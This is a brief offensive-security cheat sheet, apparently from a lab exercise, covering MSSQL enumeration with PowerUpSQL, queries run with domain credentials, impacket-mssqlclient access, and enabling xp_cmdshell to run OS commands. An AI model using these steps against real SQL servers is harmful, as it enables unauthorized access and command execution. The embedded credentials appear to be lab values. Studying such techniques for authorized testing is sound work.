Tool - [PowerUpSQL - cheat sheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)
# MSSQL enumeration 
```
Import-module .\PowerUpSQL.ps1
```
```
Get-SQLInstanceDomain
```
# Run MSSQL query
#### Windows 
```
Get-SQLQuery -Verbose -Instance "<SQL_server_ip>,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```
#### Linux 
```
impacket-mssqlclient INLANEFREIGHT/DAMUNDSEN@<sql_server-ip> -windows-auth
```
```
Help
```
```
enable_xp_cmdshell
```
```
xp_cmdshell whoami /priv
```